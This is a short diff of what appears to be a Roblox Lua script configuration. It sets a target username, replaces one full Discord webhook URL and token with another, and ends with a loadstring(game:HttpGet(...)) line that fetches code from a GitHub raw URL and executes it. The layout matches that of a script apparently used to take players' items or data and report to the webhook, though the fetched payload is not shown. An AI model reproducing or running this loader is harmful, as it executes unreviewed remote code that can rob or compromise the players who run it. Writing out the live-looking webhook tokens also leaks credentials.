@@ -1,4 +1,4 @@
 UserName = "rayanwar999"
-Webhook = "https://discord.com/api/webhooks/1095750156718186536/0sTzu9tietDS7ZNb559Hx7DnsVZux-5yv4RZpps9DoFAxwqV7MHfznghBjKdS9xtLn-h" 
+Webhook = "https://discord.com/api/webhooks/1095754323864076348/1Kg62ZRM5V9CluSGDdVlEdRJoiimPyTUONT82frxPvSQQBVnQwiu1CYuZPXm1C4RrF6S" 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/A/main/main", true))()
